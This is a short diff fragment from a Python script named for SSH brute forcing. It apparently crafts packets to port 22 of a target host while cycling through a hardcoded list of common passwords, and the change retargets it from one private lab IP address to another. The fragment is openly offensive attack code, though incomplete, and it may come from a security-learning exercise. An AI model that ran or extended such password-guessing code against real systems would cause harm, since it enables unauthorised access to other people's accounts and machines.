@@ -14,7 +14,7 @@ def ssh_brute_force(target_ip, target_port, username, passwords):
         send(packet, verbose=0)
         print(f"SSH Brute Force attempt sent to {target_ip}:{target_port} with password: {password}")
 
-target_ip = "192.168.56.1"
+target_ip = "192.168.1.66"
 target_port = 22
 
 passwords = ['password1', '12345', 'admin123', 'letmein', 'qwerty', 'abcdef']
